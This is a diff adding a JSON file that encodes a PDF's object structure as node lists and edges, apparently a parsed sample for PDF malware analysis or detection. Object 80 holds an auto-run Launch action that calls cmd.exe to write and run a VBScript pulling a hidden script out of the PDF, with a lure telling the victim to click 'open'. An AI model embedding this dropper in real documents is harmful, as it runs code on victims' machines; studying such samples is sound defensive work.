@@ -1,0 +1,208 @@
+{
+    "10": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Catalog"
+            ],
+            [
+                "/Outlines",
+                "REF",
+                "20"
+            ],
+            [
+                "/Pages",
+                "REF",
+                "30"
+            ],
+            [
+                "/OpenAction",
+                "REF",
+                "80"
+            ]
+        ],
+        "out_edge_list": [
+            20,
+            30,
+            80
+        ]
+    },
+    "20": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Outlines"
+            ],
+            [
+                "/Count",
+                "NUM",
+                "0"
+            ]
+        ],
+        "out_edge_list": []
+    },
+    "30": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Pages"
+            ],
+            [
+                "/Kids",
+                "REF_LIST",
+                "1"
+            ],
+            [
+                "/Kids",
+                "REF",
+                "40"
+            ],
+            [
+                "/Count",
+                "NUM",
+                "1"
+            ]
+        ],
+        "out_edge_list": [
+            40
+        ]
+    },
+    "40": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Page"
+            ],
+            [
+                "/Parent",
+                "REF",
+                "30"
+            ],
+            [
+                "/MediaBox",
+                "NUM_LIST",
+                "4"
+            ],
+            [
+                "/Contents",
+                "REF",
+                "50"
+            ],
+            [
+                "/Resources",
+                "DICT",
+                "<Blank>"
+            ],
+            [
+                "/Resources/ProcSet",
+                "REF",
+                "60"
+            ],
+            [
+                "/Resources/Font",
+                "DICT",
+                "<Blank>"
+            ],
+            [
+                "/Resources/Font/F1",
+                "REF",
+                "70"
+            ]
+        ],
+        "out_edge_list": [
+            30,
+            50,
+            60,
+            70
+        ]
+    },
+    "50": {
+        "insn_list": [
+            [
+                "<Blank>",
+                "STREAM",
+                "<Blank>"
+            ],
+            [
+                "/Length",
+                "NUM",
+                "46"
+            ]
+        ],
+        "out_edge_list": []
+    },
+    "60": {
+        "insn_list": [
+            [
+                "/SINGLELIST",
+                "NAME_LIST",
+                "2"
+            ]
+        ],
+        "out_edge_list": []
+    },
+    "70": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Font"
+            ],
+            [
+                "/Subtype",
+                "NAME",
+                "/Type1"
+            ],
+            [
+                "/Name",
+                "NAME",
+                "/F1"
+            ],
+            [
+                "/BaseFont",
+                "NAME",
+                "/Helvetica"
+            ],
+            [
+                "/Encoding",
+                "NAME",
+                "/MacRomanEncoding"
+            ]
+        ],
+        "out_edge_list": []
+    },
+    "80": {
+        "insn_list": [
+            [
+                "/Type",
+                "NAME",
+                "/Action"
+            ],
+            [
+                "/S",
+                "NAME",
+                "/Launch"
+            ],
+            [
+                "/Win",
+                "DICT",
+                "<Blank>"
+            ],
+            [
+                "/Win/F",
+                "STR",
+                "(cmd.exe)"
+            ],
+            [
+                "/Win/P",
+                "STR",
+                "(/c echo Set fso=CreateObject(\"Scripting.FileSystemObject\") > script.vbs && echo Set f=fso.OpenTextFile(\"doc.pdf\", 1, True) >> script.vbs && echo pf=f.ReadAll  >> script.vbs && echo s=InStr(pf,\"'SS\")  >> script.vbs && echo e=InStr(pf,\"'EE\")  >> script.vbs && echo s=Mid(pf,s,e-s)  >> script.vbs && echo Set z=fso.OpenTextFile(\"batscript.vbs\", 2, True)  >> script.vbs && echo s = Replace(s,\"%\",\"\") >> script.vbs && echo z.Write(s) >> script.vbs && script.vbs && batscript.vbs        Click the \"open\" button to view this document:)"
+            ]
+        ],
+        "out_edge_list": []
+    }
+}
